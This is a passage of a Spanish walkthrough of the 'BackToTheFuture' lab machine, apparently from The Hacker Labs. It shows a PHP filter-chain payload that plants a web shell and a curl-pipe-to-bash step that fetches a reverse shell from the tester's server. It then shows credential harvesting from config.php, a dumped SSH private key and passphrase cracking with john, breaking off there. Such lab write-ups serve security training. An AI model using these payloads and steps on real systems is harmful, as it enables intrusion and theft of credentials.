class=p>|</span>convert.iconv.8859_4.BIG5HKSCS<span class=p>|</span>convert.iconv.MSCP1361.UTF-32LE<span class=p>|</span>convert.iconv.IBM932.UCS-2BE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.ISO6937.8859_4<span class=p>|</span>convert.iconv.IBM868.UTF-16LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L4.UTF32<span class=p>|</span>convert.iconv.CP1250.UCS-2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM921.NAPLPS<span class=p>|</span>convert.iconv.855.CP936<span class=p>|</span>convert.iconv.IBM-932.UTF-8<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.8859_3.UTF16<span class=p>|</span>convert.iconv.863.SHIFT_JISX0213<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP1046.UTF16<span class=p>|</span>convert.iconv.ISO6937.SHIFT_JISX0213<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP1046.UTF32<span class=p>|</span>convert.iconv.L6.UCS-2<span class=p>|</span>convert.iconv.UTF-16LE.T.61-8BIT<span class=p>|</span>convert.iconv.865.UCS-4LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.MAC.UTF16<span class=p>|</span>convert.iconv.L8.UTF16BE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSIBM1161.UNICODE<span class=p>|</span>convert.iconv.ISO-IR-156.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.IBM932.SHIFT_JISX0213<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.base64-decode/resource<span class=o>=</span>php://temp</span></span></code></pre></div></figure></div><p>Con <code>&lt;?php system($_GET[0]);?></code> estamos estableciendo una web shell básica donde por el parámetro <code>0</code> recoge nuestro input y con la función <code>system()</code> la ejecuta a nivel de sistema. Vamos a poner esta cadena en en el parámetro <code>page</code> y al final añadiremos el parámetro que está en &ldquo;escucha&rdquo;:</p><figure><img srcset="data:image/webp;base64,UklGRiYAAABXRUJQVlA4IBoAAAAwAQCdASoQAAkAAph8J6QAA3AA/u0VhCIAAA==" data-srcset="/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_1918x0_resize_q85_h2_lanczos_3.webp 1918w" data-sizes=auto src=/images/thl/backtothefuture/11_hu4b1605d0b7eee974e1f7c92ead238e26_298846_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1918 height=1044 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><div class="callout callout-note d-flex flex-row mt-4 mb-4 pt-4 pe-4 pb-2 ps-3"><svg class="outline/info-circle svg-inline callout-icon me-2 mb-3" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 9h.01"/><path d="M11 12h1v4h1"/></svg><div class=callout-content><div class=callout-title><p>Nota</p></div><div class=callout-body><p>En este caso lo realicé en BurpSuite ya que me parece más comodo que hacerlo por la URL</p></div></div></div><p>Vemos que funcionó! Vamos a darnos una reverse shell, en este caso cree un archivo en mi máquina llamado <code>shell.sh</code> donde contiene la reverse shell y nos abriremos un servidor en <code>python3</code>:</p><figure><img srcset=data:image/webp;base64,UklGRigAAABXRUJQVlA4IBwAAAAwAQCdASoQAAUAAph8J6QAA3AA/vDH2Cs4AAAA data-srcset="/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_1907x0_resize_q85_h2_lanczos_3.webp 1907w" data-sizes=auto src=/images/thl/backtothefuture/12_hu3b1643e815a990d3efc937106216e65e_62793_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1907 height=594 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vale ahora en el servidor apuntaremos a nuestro servidor de <code>python3</code> con <code>curl</code>:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><pre tabindex=0><code>curl http://YOUR-SERVER-IP:PORT/shell.sh+|bash</code></pre></figure></div><figure><img srcset=data:image/webp;base64,UklGRigAAABXRUJQVlA4IBwAAAAwAQCdASoQAAEAAph8J6QAA3AA/uwpX4HQIAAA data-srcset="/images/thl/backtothefuture/13_hu7b52dfc7da61dadd1a0e3f33f324f1fa_5388_433x0_resize_q85_h2_lanczos_3.webp 433w" data-sizes=auto src=/images/thl/backtothefuture/13_hu7b52dfc7da61dadd1a0e3f33f324f1fa_5388_433x0_resize_q85_bgffffff_lanczos_3.jpg width=433 height=35 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><figure><img srcset="data:image/webp;base64,UklGRioAAABXRUJQVlA4IB4AAAAwAQCdASoQAA0AAph8J6QAA3AA/vDHyVkSyjcgAAA=" data-srcset="/images/thl/backtothefuture/14_huee53be9b6da1b35e5c6c1c0d78ee4e14_47605_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/14_huee53be9b6da1b35e5c6c1c0d78ee4e14_47605_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/14_huee53be9b6da1b35e5c6c1c0d78ee4e14_47605_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/14_huee53be9b6da1b35e5c6c1c0d78ee4e14_47605_887x0_resize_q85_h2_lanczos_3.webp 887w" data-sizes=auto src=/images/thl/backtothefuture/14_huee53be9b6da1b35e5c6c1c0d78ee4e14_47605_480x0_resize_q85_bgffffff_lanczos_3.jpg width=887 height=697 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Bien!! Si ponemos <code>whoami</code> veremos que somos el usuario <code>www-data</code>.</p><h2 id=shell-as-marty>Shell as marty<a href=#shell-as-marty class=anchor aria-hidden=true>#</a></h2><p>Vamos a leer el <code>/etc/passwd</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@hillvalley:~$ cat /ecat /etc/passwd
</span></span><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
</span></span><span class=line><span class=cl>tss:x:100:107:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span class=line><span class=cl>systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
</span></span><span class=line><span class=cl>messagebus:x:101:108::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>avahi-autoipd:x:102:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span class=line><span class=cl>dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
</span></span><span class=line><span class=cl>avahi:x:104:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
</span></span><span class=line><span class=cl>fwupd-refresh:x:106:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
</span></span><span class=line><span class=cl>geoclue:x:108:119::/var/lib/geoclue:/usr/sbin/nologin
</span></span><span class=line><span class=cl>polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>rtkit:x:109:120:RealtimeKit,,,:/proc:/usr/sbin/nologin
</span></span><span class=line><span class=cl>colord:x:110:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
</span></span><span class=line><span class=cl>docbrown:x:1000:1000:docbrown,,,:/home/docbrown:/bin/bash
</span></span><span class=line><span class=cl>sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span class=line><span class=cl>marty:x:1001:1001::/home/marty:/bin/bash
</span></span><span class=line><span class=cl>ftp:x:115:124:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin</span></span></code></pre></div></figure></div><p>Vemos que existen los siguientes usuarios:</p><ul><li><code>marty</code></li><li><code>docbrown</code></li></ul><p>Tambien vemos <code>lp</code> que forma parte del servicio de <a href=https://openprinting.github.io/cups/><code>CUPS</code></a>. Si recordamos hay una base de datos, tanto expuesta a nivel de red y vulnerable ante la aplicación web, vamos a hacer un <code>ls</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@hillvalley:~$ ls
</span></span><span class=line><span class=cl>about.php       css                 index.php   time_machine.php
</span></span><span class=line><span class=cl>admin.php       doc_journal.php     js
</span></span><span class=line><span class=cl>clocktower.php  flux_capacitor.php  logout.php
</span></span><span class=line><span class=cl>config.php      img                 logs.php</span></span></code></pre></div></figure></div><p>Vemos el archivo <code>config.php</code> vamos a ver su contenido:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>www</span><span class=o>-</span><span class=nx>data</span><span class=o>@</span><span class=nx>hillvalley</span><span class=o>:~</span><span class=err>$</span> <span class=nx>cat</span> <span class=nx>config</span><span class=o>.</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$host</span> <span class=o>=</span> <span class=s2>&#34;localhost&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$user</span> <span class=o>=</span> <span class=s2>&#34;marty&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$pass</span> <span class=o>=</span> <span class=s2>&#34;t1m3travel&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$db</span> <span class=o>=</span> <span class=s2>&#34;hillvalley&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$conn</span> <span class=o>=</span> <span class=nx>mysqli_connect</span><span class=p>(</span><span class=nv>$host</span><span class=p>,</span> <span class=nv>$user</span><span class=p>,</span> <span class=nv>$pass</span><span class=p>,</span> <span class=nv>$db</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$conn</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Connection failed: &#34;</span> <span class=o>.</span> <span class=nx>mysqli_connect_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div></figure></div><p>Obtuvimos las posibles credenciales del usuario <code>marty</code> que sería <code>t1m3travel</code>, vamos a probarlas por SSH:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/content<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ssh marty@192.168.44.133
</span></span><span class=line><span class=cl>marty@192.168.44.133: Permission denied <span class=o>(</span>publickey<span class=o>)</span>.</span></span></code></pre></div></figure></div><p>Vemos que necesitamos si o si un <code>id_rsa</code>, así que vamos a intentar iniciar sesión en la propia reverse shell:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@hillvalley:~$ su marty
</span></span><span class=line><span class=cl>Password: t1m3travel
</span></span><span class=line><span class=cl>marty@hillvalley:~$ whoami
</span></span><span class=line><span class=cl>marty</span></span></code></pre></div></figure></div><p>Vemos que las credenciales son validas!! Si hacemos un <code>ls -la</code> en el directorio suyo <code>home</code> nos encontraremos lo siguiente:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ ls -la
</span></span><span class=line><span class=cl>total <span class=m>56</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>7</span> marty    marty    <span class=m>4096</span> Jul <span class=m>20</span> 11:44 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root     root     <span class=m>4096</span> Jul <span class=m>12</span> 15:49 ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root     root        <span class=m>9</span> Jul <span class=m>13</span> 16:50 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty     <span class=m>220</span> Mar <span class=m>29</span>  <span class=m>2024</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty    <span class=m>3552</span> Jul <span class=m>12</span> 20:45 .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>4</span> marty    marty    <span class=m>4096</span> Jul <span class=m>12</span> 20:28 .cache
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> marty    marty    <span class=m>4096</span> Jul <span class=m>12</span> 20:28 .config
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty    <span class=m>5290</span> Jul <span class=m>12</span>  <span class=m>2023</span> .face
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> marty    marty       <span class=m>5</span> Jul <span class=m>12</span>  <span class=m>2023</span> .face.icon -&gt; .face
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> docbrown docbrown   <span class=m>80</span> Jul <span class=m>12</span> 21:19 .flux_notes
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root     root     <span class=m>4096</span> Jul <span class=m>12</span> 19:48 ftp
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> marty    marty    <span class=m>4096</span> Jul <span class=m>12</span> 20:28 .local
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> marty    marty     <span class=m>807</span> Mar <span class=m>29</span>  <span class=m>2024</span> .profile
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> marty    marty    <span class=m>4096</span> Jul <span class=m>14</span> 20:16 .ssh
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root     root       <span class=m>16</span> Jul <span class=m>14</span> 20:22 user.txt</span></span></code></pre></div></figure></div><p>Vamos a intentar leer el <code>id_rsa</code> de <code>marty</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>marty@hillvalley:~$ cat .ssh/id_rsa
</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBXUcknGX
</span></span><span class=line><span class=cl>7srNsSZgfD/Jm8AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQC+DTrijkmb
</span></span><span class=line><span class=cl>32zpAWUA7EyQUTbnnf96GXcjiSbTLp1yz4c5/+COh7xZtKeWZw+Esvz0zJ5bugKmdBlXha
</span></span><span class=line><span class=cl>wLuHxe9yeTd/YtiOV37rbfHcvNcVrleCH76YN1Sab79eSvuHSVp3UhxmGSIwScGt+y7pKV
</span></span><span class=line><span class=cl>5kp9iQ1AWg89PlaulwMlRzXGbBmDIdpjWV5PY5ceg9pDEx4mP0I4/aWF/BwaxsDNqJ+fjI
</span></span><span class=line><span class=cl>vtBvSWMeSxMKUexmg/WdYQekZq55Cq1dL7xdHZErOYMF/dWaT4GsuGIY0+oqHbewksAFq0
</span></span><span class=line><span class=cl>VL5IQ0qJPx7MMV2pHixn1/SBmOzND0C1w4LPNxinPVPfj9RgyORLreMGk2CnMKYaIqlDTX
</span></span><span class=line><span class=cl>Lg6Lz8yJ1EzjyM1YDKu5EzbkdflyI3EcPwzmJuIorvHSn9SqeX9b4r/If+JSb9L/L7nOhE
</span></span><span class=line><span class=cl>FyWEgDphumRS+4R8xpkqvYEhN9viadE2Ax9I7lDibP5XR5442oGS6lP9q0adGT55tFpCUQ
</span></span><span class=line><span class=cl>VFwU14S9f17+kAAAWQOgwYI7DC+nRQgxXPfB9gi7LDfiJuMydls05ay+I3mP/GIQ8Y9J0L
</span></span><span class=line><span class=cl>eKs7KcfAsnj1xUP0OcYWiM5Ae3+PXt3B9DuJhUsF2bARp6bTFWxB1FObtpSWr4lwH5esFT
</span></span><span class=line><span class=cl>5t82Ai8ApyDQdkMutrCHnDLGvq5wZjYJOItvp7jqvwWQu1bbOObtpRB9xJBMXSjqIFisFM
</span></span><span class=line><span class=cl>b01mvzSOrBozp96qks31sGPX2IZ55zH4WCnmE7WNnNUvj9kc5rztcO6LUssEQyNGN6DX6v
</span></span><span class=line><span class=cl>YyyfEYPPdawCCaNeQDtmsHGHNt8bYh7+yxjUItUfrXZF7/Z0BJZzVUePye89gnSk/4FlL2
</span></span><span class=line><span class=cl>44p3lJqjZAFQ7qFf7YPZVjgB6L+aCnJszg0GccOHQJiTAFcSUvJfV5zzrVh+7UOsZIkuiD
</span></span><span class=line><span class=cl>EX3U3Q/fZLe/rAaKS369qsW3+E/sNS3JOj9MWESmIPQawEa33xqbCHoHtRniKCMbAThFjB
</span></span><span class=line><span class=cl>stJwBaNindfmn8pOfqLXjTCEVu5pogix2q1yJCWte0Lz17DjnFxGFfmGvUW5q00ojpZKt4
</span></span><span class=line><span class=cl>7kuavNAcUIdlx14iqHa3xih/E90me5DDjiAC3pHvwMT/RdYvEuP1ME3b4PhSKOjL6Qg0bL
</span></span><span class=line><span class=cl>awtXmKzghLI5/8lc18y3lQAmxjs5Prg2uJ690bSgwTj4hm3CagVJB5+GBPL+5CYBfNtzG5
</span></span><span class=line><span class=cl>45QvQOqvLrSDZiQWUIdw7N9N3x+imLZxARfooR7zBAuzjFRMv4P53BeLKTbFIjXqKfBdi0
</span></span><span class=line><span class=cl>R0ne2Schv2d9tuXnH6/iBnC+LIXO6m9Z0D4PMQwG/hNh6Iy1xlHc7NynsqDM9lXQnHbv1C
</span></span><span class=line><span class=cl>S7955T7EQHGiyYnQkpEYN9LUR87hEeCruiCihv0KLFtA/hOdhj1UARTHIdv36afy6Su+mL
</span></span><span class=line><span class=cl>5PevDpytUCDfhPFOTHiF9OLee7SZOXwq8qNQCq5bNHbYR4ASZeACUOAX+ULnFo2XHYEd/0
</span></span><span class=line><span class=cl>ay5tl/a2rg1kCNjBZWzPpQWUWLHwzfdLzqAFaoJVNa4eoZ0INZ5FpDzPTbjRrwWH1raR+n
</span></span><span class=line><span class=cl>Oai+vgHQP/9rDUp602dd+h83nfR9D9k2eIt0QEZc2RF26a2t6oeMfAoJpzx+YeBIFb6Hvm
</span></span><span class=line><span class=cl>pGQ0d3ke5dNL64t5jmUDaXCu4mkytMzXBNVXImKTPNLLJBz5HcAc2RPiP+sV7R9Zu4cLMw
</span></span><span class=line><span class=cl>bNyLYoM2wkyRr/Hk910Qtkfmi1CVFZn7AQrsSIN72q92Qzb0moQcwpQ2IqQqH0lm/Hy+af
</span></span><span class=line><span class=cl>xU0+ix1wXpeCAOH4E2y38VFwcESDyIYSMA5LjmMrrYaetqklqZoo83vbPB3R6Z3jXkYZBf
</span></span><span class=line><span class=cl>MEHZqlMtH4JYbyLHoqqXbxLy3Uw/jgSmr6ieXv2BSRGw3wAflQ59Kf71pDxU7CDtaF8dqY
</span></span><span class=line><span class=cl>NoXxQ4y/FrddfOHt1Sis76Qw0gYOVEQ6NYzTA+PVtd7V2taxH05Hyleb+JY/jsow9Dy2z8
</span></span><span class=line><span class=cl>YLKKaHimIyfXgidYt3lkXmce0RVbJrVpciJXCg4xzNFrZEFMZX9SOz4gVpKR3VviYvaQcP
</span></span><span class=line><span class=cl>lQvKziHAzFEyCjcwd7r59sU9bOWOsgQWMdYJdpAS9saxvUSd7HEobB8U14kgVthqGnQoTM
</span></span><span class=line><span class=cl>RACHFSdv1OPaI3XuMQLqVpry1SAKEcaL95q11WJpOGa1PLBUCkUAoSGqC/RwFeoqUb38EQ
</span></span><span class=line><span class=cl>+lc8/GJfSfzIz74ShfM+MPqH+nKh387UqNWomAyaixyfmHHMYEyf+BH61d/ZvOwCfaO/Is
</span></span><span class=line><span class=cl>OmLQ8MicIZxQBRz/mhVbrL7fl0GqIQMh/xddKJ9L1ZzJXg7l3CvSwA8+idvDObTwJoTons
</span></span><span class=line><span class=cl>jHBz+JoWNKlpIz/gHbLbT57XMHroZbM46cMrXXY8DOxVZtCmD6zEHRhPZAZJIMr4sySi2B
</span></span><span class=line><span class=cl><span class=nv>B29crFrrs7fWLVaFeFeSou02EFE</span><span class=o>=</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----</span></span></code></pre></div></figure></div><p>Tenemos el <code>id_rsa</code>, vamos a copiarlo en nuestra máquina y darle el permiso <code>600</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/Desktop/pylon/THL/BackToTheFuture<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ chmod <span class=m>600</span> id_rsa</span></span></code></pre></div></figure></div><p>Al intentar emplear el <code>id_rsa</code> para iniciar como <code>marty</code> por el SSH, vemos que nos pide unas credenciales:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/Desktop/pylon/THL/BackToTheFuture<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ssh marty@192.168.44.133 -i id_rsa
</span></span><span class=line><span class=cl>Enter passphrase <span class=k>for</span> key <span class=s1>&#39;id_rsa&#39;</span>:</span></span></code></pre></div></figure></div><p>Probando las encontradas anteriormente no funcionan, vamos a usar <code>ssh2john</code> para sacar el hash:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/Desktop/pylon/THL/BackToTheFuture<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ssh2john id_rsa &gt; rsa_hash</span></span></code></pre></div></figure></div><p>Ahora con <code>john</code> vamos a intentar crackearlo:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/Desktop/pylon/THL/BackToTheFuture<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ john -w<span class=o>=</span>/usr/share/wordlists/rockyou.txt rsa_hash
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>SSH, SSH private key <span class=o>[</span>RSA/DSA/EC/OPENSSH 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>KDF/cipher <span class=o>[</span><span class=nv>0</span><span class=o>=</span>MD5/AES <span class=nv>1</span><span class=o>=</span>MD5/3DES <span class=nv>2</span><span class=o>=</span>Bcrypt/AES<span class=o>])</span> is <span class=m>2</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Cost <span class=m>2</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>16</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>metallica1       <span class=o>(</span>id_rsa<span class=o>)</span>
